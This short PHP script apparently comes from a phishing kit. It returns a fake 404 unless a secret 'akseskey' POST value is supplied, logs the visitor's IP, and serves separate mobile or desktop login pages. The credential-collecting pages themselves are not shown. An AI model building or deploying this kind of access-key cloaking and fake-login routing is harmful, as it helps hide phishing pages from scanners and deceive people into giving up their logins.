<?php
require_once('main.php');
require_once('get_setting.php');
if (!isset($_POST['akseskey'])) {
exit(header("HTTP/1.0 404 Not Found"));
}
$ip = getUserIP();
  if($os == "Android" or $os == "iPhone") {
    require_once("files/login-mobile.php");
  }else{
    require_once("files/login-desktop.php");
  }
?>